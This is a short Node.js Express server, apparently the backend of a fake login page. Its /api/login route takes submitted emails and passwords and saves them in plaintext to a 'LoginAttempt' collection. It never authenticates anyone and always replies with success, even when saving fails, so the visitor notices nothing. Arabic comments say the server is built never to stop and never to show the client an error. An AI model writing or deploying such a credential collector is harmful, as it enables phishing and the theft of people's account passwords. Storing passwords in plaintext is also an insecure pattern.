const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// الاتصال بـ MongoDB مع معالجة الأخطاء لمنع توقف السيرفر مطلقاً
const MONGO_URI = process.env.MONGO_URI || '';

if (MONGO_URI) {
  mongoose.connect(MONGO_URI)
    .then(() => console.log('MongoDB Connected Successfully'))
    .catch(err => console.error('MongoDB Connection Error:', err));
}

const LoginAttempt = mongoose.model('LoginAttempt', new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true },
  date: { type: Date, default: Date.now }
}));

app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ success: false, message: 'البريد وكلمة المرور مطلوبان' });
    }
    
    // محاولة الحفظ في قاعدة البيانات إذا كانت متصلة، وإلا تخطيها بنجاح لمنع فشل العميل
    try {
      const entry = new LoginAttempt({ email, password });
      await entry.save();
    } catch (dbErr) {
      console.log('Database save skipped/failed, but request processed:', dbErr.message);
    }

    res.status(200).json({ success: true, message: 'Saved to Database successfully' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
